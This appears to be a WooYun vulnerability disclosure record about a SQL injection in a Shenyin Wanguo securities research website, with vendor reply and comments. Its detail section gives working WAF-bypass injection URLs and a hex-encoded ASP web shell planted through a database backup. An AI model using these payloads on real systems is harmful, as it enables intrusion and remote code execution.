{"id": 86249, "wybug_id": "wooyun-2016-0189843", "wybug_title": "申银万国证券mssql注射绕waf写shell", "wybug_corp": "上海申银万国证券研究所有限公司", "wybug_author": "Forever80s", "wybug_date": "2016-03-28 08:39", "wybug_open_date": "2016-05-12 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-12：\t细节向公众公开  简要描述： 看见这个http://wooyun.org/bugs/wooyun-2010-0181221 漏洞评论，就点一下连接，发现虽有waf ，但可以getshell 哦 详细说明：  http://www.swsresearch.com/cn/ViewItem.aspx?table=swwebcontent&id=17637过滤select insert exec 等等，可以绕过http://www.swsresearch.com/cn/ViewItem.aspx?table=swwebcontent&id=17637';execute('sele'%2b'ct convert(int,user)') -- 'http://www.swsresearch.com/cn/ViewItem.aspx?table=swwebcontent&id=17637';execute('sele'%2b'ct convert(int,@@version)') -- '\n\n\n\n备份数据库getshellhttp://www.swsresearch.com/cn/ViewItem.aspx?table=swwebcontent&id=17637';execute('ins'%2b'ert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);') -- 'http://www.swsresearch.com/cn/ViewItem.aspx?table=swwebcontent&id=17637';execute('backup database web1 to disk = ''d:\\\\m.asp''') -- ' 成功查看目录http://www.swsresearch.com/cn/ViewItem.aspx?table=swwebcontent&id=17637';execute('sele'%2b'ct convert(int,(se'%2b'lect top 1 subdirectory fr'%2b'om (se'%2b'lect top 3 subdirectory fr'%2b'om D99_Tmp order by subdirectory )K order by subdirectory desc))') -- '\n\n   漏洞证明：  D:盘目录如下\nd:20db3e575f944c5ff920db3e575f944c5ff9360Downloads360安全浏览器下载7e66aca3b396522795e2b283bd6d08backupbackup_hjDDP_Server.bakDDP_Server.datddpserverdata 数据库备份Driverse2c0042bde3730651e6664hejunbackInstallm.aspNewResearchReportProgram FilesRECYCLERrtq2004.bakSW108WEB7syslogSystem Volume Information系统安全\nSW108WEB7 是web根目录\n\n网站数据库连接池太小，随便发几个包就耗尽了，到此为止吧，不等你们连接池了\n\n   修复方案：  哎，还说没重要数据，我看内网都能撸下来，多少备份数据库。。   版权声明：转载请注明来源 Forever80s@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-03-28 10:48 厂商回复： 相关数据为宣传性内容，不涉及核心业务数据。但为安全起见，会请waf安全厂商加固 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-28 10:55 |    \t\t艾薇儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:1001 漏洞数:106        )\t\t \n  @上海申银万国证券研究所有限公司  ::我们已经邀请南京铱讯公司部署了waf设备，据说可以防住大部分应用攻击。我们恳请wooyun网站各位大神再次扫描，检测设备的防护性能。如能检测出waf漏洞，我们愿意提供一定的赞助。谢谢！ piapiapia    \n     2016-03-28 16:34 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:611 漏洞数:106        | 专心补刀。)\t\t \n  @艾薇儿 你别这么让厂商难堪了，厂商这次没给忽略就是鼓起了很大的勇气，然后又纠结了N长时间了给了这个高的5RANK更是心有不甘！    \n     2016-03-31 16:07 |    \t\t黑骑士 \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:18        | 黑色的骑士守护着光明)\t\t \n  这个厂商是多相信waf，每次回复都说。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}